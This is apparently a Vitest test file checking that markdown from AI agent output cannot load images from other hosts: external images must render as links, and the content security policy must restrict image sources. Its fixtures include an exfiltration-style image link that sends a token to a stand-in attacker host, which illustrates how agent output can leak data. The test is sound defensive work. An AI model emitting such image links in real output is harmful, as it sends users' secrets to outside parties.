// DISP-144: markdown from agent output must not load an image from another host.
import { createElement } from 'react';
import { beforeAll, describe, expect, it } from 'vitest';
import { renderPage, stubBrowser } from './web-render.ts';
import { APP_CSP } from '../src/server/app.ts';

const md = [
  '![secret](https://attacker.example/p?d=token)',
  '![](//attacker.example/q)',
  '![shot](/api/images/3/shot.png)',
  '![dot](data:image/png;base64,iVBORw0KGgo=)',
  '![diagram](docs/diagram.png)',
].join('\n\n');

beforeAll(stubBrowser);

describe('external images in markdown (DISP-144)', () => {
  it('RichMd shows an external image as a link and keeps item and repo images', async () => {
    const { RichMd } = await import('../web/src/components/RichMd.tsx');
    const html = renderPage(createElement(RichMd, { ctx: { project: { id: 1, key: 'P' } }, children: md }));
    expect(html).not.toMatch(/<img[^>]+attacker/);
    expect(html).toContain('<a href="https://attacker.example/p?d=token" target="_blank" rel="noreferrer">secret</a>');
    expect(html).toContain('<a href="//attacker.example/q" target="_blank" rel="noreferrer">//attacker.example/q</a>');
    expect(html).toMatch(/<img src="\/api\/images\/3\/shot.png" alt="shot"/);
    expect(html).toMatch(/<img src="data:image\/png;base64,iVBORw0KGgo=" alt="dot"/);
    expect(html).toMatch(/<img src="\/api\/projects\/P\/file\?path=docs%2Fdiagram.png" alt="diagram"/);
  });

  it('Md shows an external image as a link and keeps an attachment', async () => {
    const { Md } = await import('../web/src/components/ui.tsx');
    const html = renderPage(createElement(Md, { children: md }));
    expect(html).not.toMatch(/<img[^>]+attacker/);
    expect(html).toContain('<a href="https://attacker.example/p?d=token" target="_blank" rel="noreferrer">secret</a>');
    expect(html).toMatch(/<img src="\/api\/images\/3\/shot.png" alt="shot"/);
  });

  it('the CSP loads images from no other host', () => {
    expect(APP_CSP).toContain("img-src 'self' data: blob:;");
  });
});
